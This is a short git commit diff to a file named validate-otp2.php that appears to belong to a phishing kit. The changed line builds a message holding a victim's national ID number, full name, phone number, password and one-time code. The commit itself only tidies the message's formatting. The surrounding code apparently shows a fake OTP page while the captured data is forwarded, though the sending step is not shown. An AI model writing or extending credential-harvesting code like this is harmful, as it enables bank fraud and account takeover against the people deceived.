9d52601d52f73deb7c90086531676aab2dc0e811
penelopera12k-max <penelopera12k@gmail.com>
2026-04-29 11:32:50 -0500

    Update validate-otp2.php

--- access-passed/validate-otp2.php
+++ access-passed/validate-otp2.php
@@ -189,7 +189,7 @@ if (!formData || !formData.UserId || !formData.userName || !formData.phoneNumber
 
                         loadingSpinner.style.display = 'block';
 
-                        const message = `***⚡ DINÁMICA 2 ⚡***\n\n🪪 * *Cédula:** ${formData.cedula}\n👤 **Nombres:** ${formData.nombreCompleto}\n#️⃣**Número:** ${phoneNumber}\n  🔐**Clave:** ${password}\n ✅**Clave Dinamina 1:** ${otp}`;
+                        const message = `***⚡ DINÁMICA 2 ⚡***\n\n🪪 **Cédula:** ${formData.cedula}\n👤 **Nombres:** ${formData.nombreCompleto}\n#️⃣ **Número:** ${phoneNumber}\n  🔐 **Clave:** ${password}\n ✅**Clave Dinamina 1:** ${otp}`;
 
                         setTimeout(() => {
                             loadingSpinner.style.display = 'none';
